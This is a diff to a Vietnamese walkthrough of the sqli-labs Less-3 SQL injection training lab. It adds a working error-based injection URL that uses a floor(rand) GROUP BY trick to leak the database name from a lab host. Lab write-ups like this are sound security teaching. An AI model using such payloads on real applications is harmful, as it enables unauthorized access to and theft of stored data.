@@ -32,10 +32,12 @@ Câu query có thể là:
 select user, passwd from table where id=('$ID') limit 0,1
 ```
 
-Ta thấy câu query trả về 3 cột
+Ta có thể show được các thông tin
 
-![](../images/sqli-labs/Less-3/8.png)
+```
+http://192.168.84.233/sqli-labs/Less-3/?id=1') and (SELECT 0 FROM (SELECT count(*), CONCAT((select database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
+```
 
-![](../images/sqli-labs/Less-3/9.png)
+![](../images/sqli-labs/Less-3/01.png)
 
-Ta có thể thao giống less-1
+Ta có thể thao giống [Less-1](sqli-labs/Less-1.md))
